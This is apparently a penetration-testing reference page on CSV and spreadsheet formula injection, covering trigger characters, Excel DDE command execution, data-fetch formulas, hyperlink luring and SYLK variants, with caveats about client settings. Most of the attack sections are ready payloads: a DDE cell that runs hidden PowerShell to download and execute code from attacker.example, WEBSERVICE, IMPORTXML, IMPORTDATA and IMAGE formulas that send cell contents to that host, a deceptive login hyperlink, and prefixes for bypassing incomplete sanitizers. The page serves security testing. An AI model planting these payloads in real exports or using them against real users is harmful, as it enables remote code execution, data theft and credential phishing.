---
title: "CSV formula injection"
description: "Exported cells beginning with formula trigger characters may be interpreted by spreadsheet software, with impact depending on the client, platform, trust settings, and external-content controls."
keywords:
  - csv injection
  - formula injection
  - spreadsheet
  - dde
  - webservice
  - hyperlink
---

# CSV

Spreadsheet software may interpret a cell as a formula when its text begins with certain characters. If an application exports attacker-controlled data to CSV or another spreadsheet format without neutralizing those cells, opening or importing the file can evaluate the formula. The resulting impact depends on the spreadsheet client, operating system, protected-view state, external-content policy, and whether the user approves a warning.

## Trigger characters

A cell is treated as a formula when it starts with any of:

```
=   +   -   @
```

Tab (`0x09`) and carriage return (`0x0D`) also lead into formula parsing in some clients. Any stored field that reaches the export (username, comment, product name, address line) is a candidate. Submit the payload through the normal app form; it fires when a victim opens the generated spreadsheet.

## Command execution via DDE

Excel's legacy Dynamic Data Exchange (DDE) can pass formula input to another program. The classic proof requests the command interpreter as a DDE server:

```
=cmd|'/c calc'!A1
```

On legacy or deliberately weakened installations where Excel may launch a DDE server, the command can request further actions:

```
=cmd|'/c powershell -w hidden -c "iwr http://attacker.example/a|iex"'!A1
```

Supported Excel versions disable DDE server launch by default. The payload above does not start `cmd.exe` unless policy or the user's Trust Center configuration permits server launch; other protected-view and content warnings may also intervene. DDE server lookup for an already running program is a separate setting. Treat command execution as a client-and-policy-specific outcome, not an automatic consequence of opening a CSV.

A cell is parsed as a formula only when its **first byte** is a trigger, so where a sanitizer strips or escapes only a leading `=` but overlooks the other triggers, lead with one of those instead. `+`, `-`, `@`, a tab (`0x09`), and a carriage return (`0x0D`) can lead into formula parsing, depending on the client:

```
@cmd|'/c calc'!A1
+cmd|'/c calc'!A1
```

A leading tab or CR before `=` works the same way: the whitespace is consumed and `=cmd|'/c calc'!A1` still parses. Prefixing a second trigger after the one being removed does not help, since once the first byte is stripped the survivor starts with text.

## Data-fetch formulas

Some functions can request a URL and place cell data in its query string. Excel's `WEBSERVICE` is available on Windows but does not return results on Excel for Mac. Whether the request occurs automatically depends on protected view, external-content settings, trust state, and organizational policy:

```
=WEBSERVICE("http://attacker.example/x?v="&A1)
=WEBSERVICE(CONCATENATE("http://attacker.example/?",A1))
```

Google Sheets offers functions that retrieve remote content, but import authorization, recalculation behavior, and service-side restrictions can prevent an automatic request. Verify the exact client behavior rather than assuming that viewing the sheet is sufficient:

```
=IMPORTXML("http://attacker.example/?d="&A2,"//a")
=IMPORTDATA("http://attacker.example/?d="&A2)
=IMAGE("http://attacker.example/?d="&A2)
```

## Hyperlink luring

`HYPERLINK` renders clickable text that masks a hostile destination, useful for credential capture or payload delivery:

```
=HYPERLINK("http://attacker.example/login","Open quarterly report")
```

## TSV, SYLK, and XLS variants

The same formula cells apply when the export is tab-separated; the trigger characters are identical, only the delimiter differs. SYLK files parse formulas directly, so a file served with a `.slk` extension and an `ID;P` header executes cell expressions:

```
ID;P
C;X1;Y1;K0;E=cmd|'/c calc'!A1
E
```

Real `.xls` and `.xlsx` exports carry formulas natively, so any attacker string written into a formula-typed cell evaluates with no leading-character trick required.

## Tools

- **LibreOffice Calc / Excel**: open the exported file to verify formula execution.
- **[Burp Suite](https://portswigger.net/burp)**: Repeater for submitting formula payloads into stored fields.
- Manual payloads using the trigger characters (`=`, `+`, `-`, `@`).

## References

- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [Microsoft: manage DDE and OLE activation security settings](https://support.microsoft.com/en-us/excel/microsoft-excel-security-enhancements-in-the-january-2022-update-kb5010321)
- [Microsoft: WEBSERVICE function](https://support.microsoft.com/en-us/excel/functions/webservice-function)
- [PayloadsAllTheThings: CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)
